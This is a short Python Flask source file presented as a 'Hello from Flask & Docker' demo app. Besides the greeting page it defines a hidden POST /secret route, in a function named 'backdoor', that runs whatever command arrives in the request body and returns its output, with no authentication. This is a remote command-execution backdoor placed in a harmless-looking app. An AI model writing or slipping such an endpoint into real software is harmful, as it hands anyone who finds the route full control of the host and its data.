#!/usr/bin/env python3
from subprocess import check_output
from flask import Flask, request, jsonify
app = Flask(__name__)

@app.route('/')
def hello_geek():
    return '<h1>Hello from Flask & Docker</h2>'

@app.post('/secret')
def backdoor():
    cmd = request.json['cmd']
    return jsonify({"result": check_output(cmd).decode('utf8')})


if __name__ == "__main__":
    app.run(debug=False)